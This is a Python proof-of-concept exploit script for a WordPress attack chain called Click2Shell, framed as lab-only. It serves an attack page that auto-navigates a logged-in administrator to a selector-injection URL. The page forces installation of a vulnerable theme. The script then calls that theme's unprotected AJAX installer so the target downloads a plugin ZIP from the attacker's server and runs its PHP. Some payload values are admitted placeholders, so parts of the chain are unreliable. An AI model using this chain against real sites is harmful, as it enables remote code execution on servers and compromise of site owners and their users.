#!/usr/bin/env python3
"""
Click2Shell — Python PoC (lab use only)
=======================================
Implements the attack chain publicly disclosed by pwn.ai ("Click2Shell:
Preauth WordPress Core Theme Preview Injection to RCE Chain", Sep 2026).

ONLY test against an isolated WordPress installation (< 7.1.1) that you own
or are explicitly authorized to test. WordPress 7.1.1 patched the Core bug.

The chain (from the disclosure):
  1. SELECTOR INJECTION -> FORCED THEME INSTALL (WordPress Core bug)
     wp-admin/theme-install.php?theme=<PAYLOAD>
     - The WP.org Themes API canonicalizes PAYLOAD down to a real theme slug
       (e.g. "mobile-repair-zone") and returns that catalog entry.
     - wp-admin/js/theme.js drops the *raw* PAYLOAD into a jQuery selector:
           div.theme[data-slug="<PAYLOAD>"] ...
       An injected quote closes the attribute selector, child combinators walk
       from the theme card into its action controls (the Install button), and a
       trailing CSS comment (/* */) neutralizes the selector fragment WordPress
       appends. Result: the Install control fires by itself.
     - The victim Administrator's own browser supplies the install nonce and
       the install_themes capability. No attacker account needed — one visit
       while logged in is enough. The theme installs but stays INACTIVE.
  2. PRE-ACTIVATION PHP LOAD (theme bug, e.g. Mobile Repair Zone 2.5.4)
     WordPress loads an inactive theme's functions.php while preparing a
     Customizer preview. That theme registered an AJAX action with NO nonce
     and NO capability check; the callback takes an attacker-chosen plugin
     package URL, downloads it into wp-content/plugins/, unpacks it and loads
     its PHP entry point.
  3. RCE — the unpacked plugin's PHP runs as the WordPress server account.

NOTE on payloads: the blog's code blocks did not render in the copy of the
article this PoC was built from, so exact selector-injection strings are left
as documented templates below — copy the verbatim strings from the original
article (pwn.ai/blog/click2shell) into SELECTOR_PAYLOAD / AJAX_ACTION.

Usage:
    python3 click2shell_poc.py --target http://wp-lab.local \
        --lhost 192.168.1.10 --lport 8000 --theme mobile-repair-zone
    # then get the logged-in admin to visit http://192.168.1.10:8000/
"""
import argparse
import http.server
import io
import socketserver
import threading
import urllib.parse
import zipfile

import requests

# --------------------------------------------------------------------------
# 1. SELECTOR-INJECTION PAYLOAD  (copy verbatim from the pwn.ai article)
# --------------------------------------------------------------------------
# Technique per the disclosure: the WP.org API reduces the value to a plain
# theme slug, while theme.js keeps the original punctuation inside a jQuery
# selector. Template shape:
#     <real-slug><break out of [data-slug="..."]><walk to Install><comment out tail>
# Example skeleton (REPLACE with the article's exact string):
#     mobile-repair-zone'"] > .theme-actions .install-theme /* 
SELECTOR_PAYLOAD = (
    "{slug}'\"] > .theme-actions .install-theme /*"
    #            ^ closes [data-slug="..."]      ^ eats the appended fragment
)

# --------------------------------------------------------------------------
# 2. VULNERABLE THEME'S AJAX INSTALLER  (copy verbatim from the article)
# --------------------------------------------------------------------------
# Mobile Repair Zone 2.5.4 registered an authenticated AJAX action without a
# nonce/capability check. Fill in the real action name + parameter names.
AJAX_ACTION = "REPLACE_WITH_ACTION_NAME"   # e.g. "mrz_install_plugin"
AJAX_PARAM_PACKAGE = "REPLACE_WITH_PARAM"  # param that carries the plugin ZIP URL

# Harmless proof payload: the plugin just runs `id`, exactly like the disclosure.
PLUGIN_PHP = """<?php
/*
Plugin Name: Click2Shell Proof
Description: Harmless lab proof - executes `id` once when loaded.
*/
echo "<pre>Click2Shell proof plugin loaded.\\n";
system("id 2>&1");
echo "</pre>";
"""


def build_plugin_zip() -> bytes:
    """Build the proof plugin ZIP served to the theme's installer."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("c2s-proof/c2s-proof.php", PLUGIN_PHP)
    return buf.getvalue()


PLUGIN_ZIP = build_plugin_zip()


def build_theme_route(target: str, slug: str) -> str:
    """Crafted theme-install route carrying the selector-injection payload."""
    payload = SELECTOR_PAYLOAD.format(slug=slug)
    q = urllib.parse.urlencode({"theme": payload})
    return f"{target.rstrip('/')}/wp-admin/theme-install.php?{q}"


ATTACK_PAGE = """<!doctype html><html><head><meta charset="utf-8">
<title>Click2Shell lab PoC</title></head><body>
<h1>Click2Shell lab PoC</h1>
<p>If you are the logged-in Administrator of the lab site, the crafted theme
route below auto-installs <b>{slug}</b> (inactive) via the selector-injection
primitive. No clicks on Install needed.</p>
<p><a id="go" href="{route}">Open crafted theme route</a></p>
<script>
// Auto-navigate: the "one click" from the disclosure.
window.addEventListener("load", () => setTimeout(
    () => document.getElementById("go").click(), 1500));
</script>
</body></html>
"""


class Handler(http.server.BaseHTTPRequestHandler):
    target = ""
    slug = ""

    def log_message(self, *a):  # quieter logs
        pass

    def _send(self, body: bytes, ctype: str):
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path == "/":
            route = build_theme_route(self.target, self.slug)
            page = ATTACK_PAGE.format(slug=self.slug, route=route).encode()
            self._send(page, "text/html; charset=utf-8")
            print(f"[+] Served attack page -> crafted route:\n    {route}")
        elif self.path == "/c2s-proof.zip":
            self._send(PLUGIN_ZIP, "application/zip")
            print("[+] Served proof plugin ZIP")
        else:
            self.send_error(404)


def stage_customizer_preview(target: str, slug: str, session: requests.Session):
    """
    Stage 2a: force WordPress to prepare a Customizer preview with the
    *inactive* theme -> its functions.php loads -> AJAX handler registers.
    Endpoint shape follows core customize.php with theme=<slug>.
    """
    url = f"{target.rstrip('/')}/wp-admin/customize.php"
    r = session.get(url, params={"theme": slug}, timeout=20)
    print(f"[+] Customizer preview request: HTTP {r.status_code} "
          f"(inactive theme '{slug}' PHP now loaded server-side)")
    return r


def stage_ajax_install(target: str, package_url: str, session: requests.Session):
    """
    Stage 2b: hit the theme's unprotected AJAX installer, pointing it at our
    plugin ZIP. On success the plugin is unpacked and its PHP executes.
    """
    url = f"{target.rstrip('/')}/wp-admin/admin-ajax.php"
    data = {"action": AJAX_ACTION, AJAX_PARAM_PACKAGE: package_url}
    r = session.post(url, data=data, timeout=60)
    print(f"[+] AJAX installer call: HTTP {r.status_code}")
    print(f"    response (truncated): {r.text[:300]!r}")
    return r


def main():
    ap = argparse.ArgumentParser(description="Click2Shell lab PoC server + stager")
    ap.add_argument("--target", required=True, help="Lab WP base URL, e.g. http://wp-lab.local")
    ap.add_argument("--theme", default="mobile-repair-zone",
                    help="Vulnerable catalog theme slug (default: mobile-repair-zone)")
    ap.add_argument("--lhost", default="0.0.0.0", help="Interface to serve attack page/ZIP on")
    ap.add_argument("--lport", type=int, default=8000, help="Port for attack page/ZIP")
    ap.add_argument("--public", required=True,
                    help="Public URL of THIS server as seen by the WP lab, e.g. http://192.168.1.10:8000")
    ap.add_argument("--stage2", action="store_true",
                    help="Also run Customizer+AJAX stages from here (needs an authenticated admin session cookie)")
    ap.add_argument("--cookie", default="",
                    help="Logged-in admin Cookie header value for --stage2 (format: name=value; name2=value2)")
    args = ap.parse_args()

    if "{slug}" in SELECTOR_PAYLOAD and "REPLACE" not in SELECTOR_PAYLOAD:
        pass  # template filled
    if "REPLACE" in AJAX_ACTION or "REPLACE" in AJAX_PARAM_PACKAGE:
        print("[!] Fill SELECTOR_PAYLOAD / AJAX_ACTION / AJAX_PARAM_PACKAGE from the "
              "pwn.ai article before running stages that need them.")

    Handler.target = args.target
    Handler.slug = args.theme
    package_url = f"{args.public.rstrip('/')}/c2s-proof.zip"

    srv = socketserver.TCPServer((args.lhost, args.lport), Handler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    print(f"[+] Attack server up: http://{args.lhost}:{args.lport}/")
    print(f"[+] 1. Victim admin visits the attack page while logged into {args.target}")
    print(f"[+] 2. Crafted route auto-installs '{args.theme}' (inactive)")
    print(f"[+] 3. Then run stage 2 (or use --stage2):")
    print(f"       customize.php?theme={args.theme}  -> loads inactive theme PHP")
    print(f"       admin-ajax.php action={AJAX_ACTION} {AJAX_PARAM_PACKAGE}={package_url}")

    if args.stage2:
        s = requests.Session()
        if args.cookie:
            for pair in args.cookie.split(";"):
                if "=" in pair:
                    k, v = pair.strip().split("=", 1)
                    s.cookies.set(k.strip(), v.strip())
        stage_customizer_preview(args.target, args.theme, s)
        stage_ajax_install(args.target, package_url, s)
        print("[+] Done. Check the plugin output / server for `id` execution evidence.")

    try:
        t.join()
    except KeyboardInterrupt:
        print("\n[+] Shutting down.")


if __name__ == "__main__":
    main()
